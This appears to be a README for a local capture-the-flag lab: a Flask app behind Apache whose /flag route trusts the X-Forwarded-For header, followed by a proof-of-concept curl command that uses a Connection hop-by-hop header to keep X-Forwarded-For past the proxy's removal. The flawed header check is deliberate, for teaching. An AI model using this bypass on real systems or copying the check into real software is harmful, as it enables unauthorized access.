### Apache + Flask

Add 'RequestHeader unset X-Forwarded-For' to httpd.conf

'x-forwarded-for' Must be equal to '127.0.0.1'

Try to access /flag from 127.0.0.1

### Usage

Build and run
```
docker-compose up
```

### Hint
httpd.conf
```
RequestHeader unset X-Forwarded-For
```

Go http://127.0.0.1:8089/

app.py
``` python
@app.route('/flag')
def flag():

    src_ip = None
    if 'x-forwarded-for' in request.headers:
            src_ip = request.headers['x-forwarded-for']

    if src_ip is None:
        src_ip = request.remote_addr

    if src_ip == '127.0.0.1':
        return open('flag','r').read()
    else:
        return 'IP From %s is forbidden' % src_ip
```

### POC
``` bash
curl "http://127.0.0.1:8089/flag" -H "X-Forwarded-For: 127.0.0.1" -H "Connection: X-Forwarded-For"
```